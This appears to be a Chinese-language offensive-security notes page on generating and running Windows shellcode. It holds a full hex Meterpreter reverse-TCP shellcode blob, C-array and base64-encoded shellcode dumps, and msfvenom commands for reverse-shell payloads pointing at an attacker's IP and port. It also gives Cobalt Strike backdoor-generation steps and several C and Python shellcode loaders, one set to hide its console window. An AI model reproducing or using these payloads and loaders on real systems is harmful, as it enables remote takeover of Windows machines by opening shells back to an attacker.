+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc4883e4f0e8cc00000041514150524831d265488b526051488b521856488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40208b4818504901d0e35648ffc9418b34884d31c94801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc02001f907f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x86-2"><a href="#Windows-x86-2" class="headerlink" title="Windows x86"></a>Windows x86</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -f hex</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x64-2"><a href="#Windows-x64-2" class="headerlink" title="Windows x64"></a>Windows x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -f hex</span><br></pre></td></tr></table></figure>
+
+<h2 id="ShellCode执行CMD命令"><a href="#ShellCode执行CMD命令" class="headerlink" title="ShellCode执行CMD命令"></a>ShellCode执行CMD命令</h2><h3 id="msf生成ShellCode-2"><a href="#msf生成ShellCode-2" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h3><h4 id="Windows-x64-3"><a href="#Windows-x64-3" class="headerlink" title="Windows x64"></a>Windows x64</h4><h5 id="2进制"><a href="#2进制" class="headerlink" title="2进制"></a>2进制</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -a x64</span><br></pre></td></tr></table></figure>
+
+<h5 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f csharp</span><br></pre></td></tr></table></figure>
+
+<h2 id="C语言ShellCode"><a href="#C语言ShellCode" class="headerlink" title="C语言ShellCode"></a>C语言ShellCode</h2><h3 id="CobaltStrike生成ShellCode-1"><a href="#CobaltStrike生成ShellCode-1" class="headerlink" title="CobaltStrike生成ShellCode"></a>CobaltStrike生成ShellCode</h3><h4 id="Windows-x86-3"><a href="#Windows-x86-3" class="headerlink" title="Windows x86"></a>Windows x86</h4><ul>
+<li><p><code>攻击</code>-&gt;<code>生成后门</code>-&gt;<code>Payload生成器</code></p>
+</li>
+<li><p>选择<code>监听器</code>，<code>输出格式</code>选择<code>C</code>，<code>x64</code>取消勾选<code>使用x64 payload</code>-&gt;<code>生成</code></p>
+</li>
+</ul>
+<h4 id="Windows-x64-4"><a href="#Windows-x64-4" class="headerlink" title="Windows x64"></a>Windows x64</h4><ul>
+<li><p><code>攻击</code>-&gt;<code>生成后门</code>-&gt;<code>Payload生成器</code></p>
+</li>
+<li><p>选择<code>监听器</code>，<code>输出格式</code>选择<code>C</code>，<code>x64</code>勾选<code>使用x64 payload</code>-&gt;<code>生成</code></p>
+</li>
+</ul>
+<h3 id="msf生成ShellCode-3"><a href="#msf生成ShellCode-3" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h3><ul>
+<li>生成结果形如</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span><br><span class="line">&quot;\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51&quot;</span><br><span class="line">&quot;\x48\x8b\x52\x20\x56\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span><br><span class="line">&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span><br><span class="line">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span><br><span class="line">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span><br><span class="line">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span><br><span class="line">&quot;\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49&quot;</span><br><span class="line">&quot;\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88&quot;</span><br><span class="line">&quot;\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1&quot;</span><br><span class="line">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span><br><span class="line">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span><br><span class="line">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01&quot;</span><br><span class="line">&quot;\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span><br><span class="line">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span><br><span class="line">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span><br><span class="line">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span><br><span class="line">&quot;\x89\xe5\x49\xbc\x02\x00\x1f\x90\x7f\x00\x00\x01\x41\x54&quot;</span><br><span class="line">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span><br><span class="line">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span><br><span class="line">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span><br><span class="line">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span><br><span class="line">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span><br><span class="line">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span><br><span class="line">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span><br><span class="line">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span><br><span class="line">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span><br><span class="line">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span><br><span class="line">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span><br><span class="line">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span><br><span class="line">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span><br><span class="line">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span><br><span class="line">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span><br><span class="line">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span><br><span class="line">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span><br><span class="line">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span><br><span class="line">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x86-4"><a href="#Windows-x86-4" class="headerlink" title="Windows x86"></a>Windows x86</h4><blockquote>
+<p><code>&lt;ip_remote&gt;</code>：攻击者IP地址<br><code>&lt;port_remote&gt;</code>：攻击者监听的端口号<br><code>-o x.c</code>：输出为文件</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -f c</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x64-5"><a href="#Windows-x64-5" class="headerlink" title="Windows x64"></a>Windows x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -f c</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf生成ShellCode（Base64编码）"><a href="#msf生成ShellCode（Base64编码）" class="headerlink" title="msf生成ShellCode（Base64编码）"></a>msf生成ShellCode（Base64编码）</h3><ul>
+<li>生成的结果形如</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45&quot;</span><br><span class="line">&quot;\x46\x52\x51\x56\x42\x53\x53\x44\x48\x53\x55\x57\x56\x49&quot;</span><br><span class="line">&quot;\x69\x31\x4a\x67\x53\x49\x74\x53\x47\x45\x69\x4c\x55\x69&quot;</span><br><span class="line">&quot;\x42\x57\x53\x41\x2b\x33\x53\x6b\x70\x4e\x4d\x63\x6c\x49&quot;</span><br><span class="line">&quot;\x69\x33\x4a\x51\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41&quot;</span><br><span class="line">&quot;\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42\x41\x63\x48\x69&quot;</span><br><span class="line">&quot;\x37\x56\x4a\x49\x69\x31\x49\x67\x51\x56\x47\x4c\x51\x6a&quot;</span><br><span class="line">&quot;\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59\x43\x77\x49\x50&quot;</span><br><span class="line">&quot;\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49\x67\x41\x41\x41&quot;</span><br><span class="line">&quot;\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42\x30\x49\x74\x49&quot;</span><br><span class="line">&quot;\x47\x45\x53\x4c\x51\x43\x42\x4a\x41\x64\x42\x51\x34\x31&quot;</span><br><span class="line">&quot;\x5a\x49\x2f\x38\x6c\x42\x69\x7a\x53\x49\x53\x41\x48\x57&quot;</span><br><span class="line">&quot;\x54\x54\x48\x4a\x53\x44\x48\x41\x72\x45\x48\x42\x79\x51&quot;</span><br><span class="line">&quot;\x31\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e\x4d&quot;</span><br><span class="line">&quot;\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30&quot;</span><br><span class="line">&quot;\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45&quot;</span><br><span class="line">&quot;\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45&quot;</span><br><span class="line">&quot;\x67\x42\x30\x45\x46\x59\x51\x56\x68\x65\x57\x56\x70\x42&quot;</span><br><span class="line">&quot;\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56&quot;</span><br><span class="line">&quot;\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70&quot;</span><br><span class="line">&quot;\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c&quot;</span><br><span class="line">&quot;\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a\x69\x65\x5a\x49&quot;</span><br><span class="line">&quot;\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59\x6e\x6c\x53\x62&quot;</span><br><span class="line">&quot;\x77\x43\x41\x42\x2b\x51\x66\x77\x41\x41\x41\x55\x46\x55&quot;</span><br><span class="line">&quot;\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51\x62\x70\x4d\x64\x79&quot;</span><br><span class="line">&quot;\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f\x41\x51\x45\x41&quot;</span><br><span class="line">&quot;\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44\x2f\x31\x57&quot;</span><br><span class="line">&quot;\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55\x30\x78&quot;</span><br><span class="line">&quot;\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77\x45&quot;</span><br><span class="line">&quot;\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56&quot;</span><br><span class="line">&quot;\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b&quot;</span><br><span class="line">&quot;\x69\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56&quot;</span><br><span class="line">&quot;\x68\x63\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a&quot;</span><br><span class="line">&quot;\x4d\x41\x41\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69&quot;</span><br><span class="line">&quot;\x54\x54\x48\x4a\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55&quot;</span><br><span class="line">&quot;\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41&quot;</span><br><span class="line">&quot;\x66\x6c\x56\x49\x67\x38\x51\x67\x58\x6f\x6e\x32\x61\x6b&quot;</span><br><span class="line">&quot;\x42\x42\x57\x57\x67\x41\x45\x41\x41\x41\x51\x56\x68\x49&quot;</span><br><span class="line">&quot;\x69\x66\x4a\x49\x4d\x63\x6c\x42\x75\x6c\x69\x6b\x55\x2b&quot;</span><br><span class="line">&quot;\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d\x4a\x78\x30\x30\x78&quot;</span><br><span class="line">&quot;\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b\x69\x4a\x2b\x55&quot;</span><br><span class="line">&quot;\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41&quot;</span><br><span class="line">&quot;\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41\x41\x41&quot;</span><br><span class="line">&quot;\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38\x50&quot;</span><br><span class="line">&quot;\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57&quot;</span><br><span class="line">&quot;\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f&quot;</span><br><span class="line">&quot;\x53\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62&quot;</span><br><span class="line">&quot;\x52\x42\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43&quot;</span><br><span class="line">&quot;\x38\x4c\x57\x69\x56\x76\x2f\x56&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x86-5"><a href="#Windows-x86-5" class="headerlink" title="Windows x86"></a>Windows x86</h4><blockquote>
+<p><code>&lt;ip_remote&gt;</code>：攻击者IP地址<br><code>&lt;port_remote&gt;</code>：攻击者监听的端口号<br><code>-o x.c</code>：输出为文件</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; --encrypt base64 -f c</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x64-6"><a href="#Windows-x64-6" class="headerlink" title="Windows x64"></a>Windows x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; --encrypt base64 -f c</span><br></pre></td></tr></table></figure>
+
+<h3 id="针对于Windows的ShellCode执行器"><a href="#针对于Windows的ShellCode执行器" class="headerlink" title="针对于Windows的ShellCode执行器"></a>针对于Windows的ShellCode执行器</h3><h4 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h4><blockquote>
+<p><code>#pragma comment(linker, &quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</code>：Windows程序执行时不弹出CMD窗口</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="type">void</span>(WINAPI*)(<span class="type">void</span>))&amp;buf)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        lea eax, [buf]</span><br><span class="line">        call eax</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, offset buf</span><br><span class="line">        _emit <span class="number">0xFF</span></span><br><span class="line">        _emit <span class="number">0xE0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="ChaitanyaHaritash-Callback-Shellcode-Injection"><a href="#ChaitanyaHaritash-Callback-Shellcode-Injection" class="headerlink" title="ChaitanyaHaritash&#x2F;Callback_Shellcode_Injection"></a>ChaitanyaHaritash&#x2F;Callback_Shellcode_Injection</h5><h6 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection.git</span><br></pre></td></tr></table></figure>
+
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(buf), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(buf), <span class="built_in">len</span>(buf))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(buf)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(buf)).from_buffer(buf)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(buf)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_int(ptr), ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
